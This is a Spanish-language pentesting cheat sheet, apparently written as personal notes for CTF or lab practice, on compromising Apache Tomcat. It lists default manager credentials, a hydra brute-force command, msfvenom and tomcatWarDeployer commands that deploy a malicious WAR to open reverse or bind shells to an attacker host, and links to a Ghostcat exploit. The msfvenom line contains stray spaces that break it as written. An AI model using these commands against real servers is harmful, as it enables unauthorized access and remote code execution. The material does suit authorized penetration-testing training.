# Tomcat Explotation

Tomcat es un servicio que se ejecuta en el puerto 80 o 443 preferentemente y es en esos puertos donde pueden comprobar el servicio y la version para ver si estan ante un tomcat.

- [[#Credenciales predeterminadas|Credenciales predeterminadas]]
- [[#fuerza bruta|fuerza bruta]]
- [[#RCE|RCE]]


## Credenciales predeterminadas

La ruta más interesante de Tomcat es **/ manager / html** , dentro de esa **ruta puede cargar e implementar archivos war** (ejecutar código). Pero esta ruta está protegida por autenticación básica de HTTP, las credenciales más comunes son:

* admin: admin
* tomcat: tomcat
* admin: \<NADA\>
* admin: s3cr3t
* **tomcat: s3cr3t**
* admin: tomcat
	
## fuerza bruta 

Mediante hidra puede realizar ataque de fuerza bruta a la autenticacion basica HTTP:

```bash
hydra -L users.txt -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt -f 10.10.10.64 http-get /manager/html
```

## RCE

Puede crear un .war malicioso con msfvenom y subir al war a la pagina y deployarlo:

```bash
msfvenom -p java / jsp_shell_reverse_tcp LHOST = 10.11.0.41 LPORT = 80 -f war -o revshell.war
```

o puede usar el script [tomcatWarDeployer.py](https://github.com/mgeeky/tomcatWarDeployer):

```bash
git clone https://github.com/mgeeky/tomcatWarDeployer.git
```

reverse shell:

```bash
./tomcatWarDeployer.py -U <username> -P <password> -H <ATTACKER_IP> -p <ATTACKER_PORT> <VICTIM_IP>:<VICTIM_PORT>/manager/html/
```

bind shell:

```bash
./tomcatWarDeployer.py -U <username> -P <password> -p <bind_port> <victim_IP>:<victim_PORT>/manager/html/
```

en algunos casos pedira que agregue el parametro **-x** al final.

```bash
./tomcatWarDeployer.py -U <username> -P <password> -H <ATTACKER_IP> -p <ATTACKER_PORT> <VICTIM_IP>:<VICTIM_PORT>/manager/html/ -x
``` 

## GHOSTCAT

La vulnerabilidad Apache Ghostcat es una vulnerabilidad de inclusión de archivos que apareció en el primer trimestre de este año (2020) mientras el mundo se preparaba para una lucha de bloqueo contra el coronavirus.

Las versiones 6.x, 7.x, 8.x y 9.x de Apache Tomcat son vulnerables a este problema de Ghostcat.

```bash
8009/tcp abierto ajp13 Apache Jserv (Protocolo v1.3)

8080/tcp abierto http Apache Tomcat 9.0.30
```

EJEMPLO: [https://apkash8.medium.com/hunting-and-exploiting-apache-ghostcat-b7446ef83e74](https://apkash8.medium.com/hunting-and-exploiting-apache-ghostcat-b7446ef83e74)

exploit: [https://github.com/00theway/Ghostcat-CNVD-2020-10487](https://github.com/00theway/Ghostcat-CNVD-2020-10487)

practicar: [https://tryhackme.com/room/tomghost](https://tryhackme.com/room/tomghost)